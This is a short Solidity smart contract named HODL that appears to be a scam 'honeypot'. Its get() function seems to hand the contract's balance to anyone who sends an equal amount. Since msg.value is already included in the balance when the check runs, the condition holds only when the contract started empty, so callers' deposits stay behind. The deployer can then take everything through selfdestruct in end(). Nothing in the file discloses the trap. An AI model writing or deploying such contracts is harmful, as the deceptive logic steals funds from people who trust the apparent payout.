1 pragma solidity ^0.4.25;
2 
3 contract HODL
4 {
5     address hodl = msg.sender;
6     function() external payable {}
7     function end() public {
8         if (msg.sender==hodl)
9             selfdestruct(msg.sender);
10     }
11     function get() public payable {
12         if (msg.value >= address(this).balance)
13             msg.sender.transfer(address(this).balance);
14     }
15 }